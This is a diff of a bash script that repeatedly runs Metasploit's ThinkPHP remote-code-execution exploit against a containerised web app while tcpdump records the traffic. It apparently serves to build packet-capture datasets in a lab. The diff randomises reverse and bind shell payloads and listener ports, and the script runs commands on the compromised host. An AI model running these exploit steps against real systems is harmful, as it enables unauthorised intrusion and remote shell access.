@@ -1,8 +1,7 @@
 #! /bin/bash
 
 read -p "Enter number of packets: " PACK_NUMBER
-
-# create a network for ThinkPHP and Metasploit to reside on 
+payloads=("linux/x64/shell/reverse_tcp" "linux/x64/shell/bind_tcp" "linux/x64/shell_bind_tcp" "linux/x64/shell_reverse_tcp")
 
 for ((i = 1; i <= PACK_NUMBER; i++))
 do 
@@ -15,13 +14,14 @@ exit
 EOF
 
 tcpdump -i br_php_int host 172.28.0.2 or host 172.28.0.3 -w ${i}.pcap & 
-
+portN=$(shuf -i 4000-5000 -n 1)
 docker run -i --name metasploit --net phpsite --ip=172.28.0.3 metasploitframework/metasploit-framework <<EOF
 use exploit/unix/webapp/thinkphp_rce
-set payload linux/x64/shell/reverse_tcp
+set payload ${payloads[$RANDOM % ${#payloads[@]} ]}
 set RHOSTS 172.28.0.2
 set LHOST 172.28.0.3
 set RPORT 80
+set LPORT $portN
 exploit
 ls
 ls /
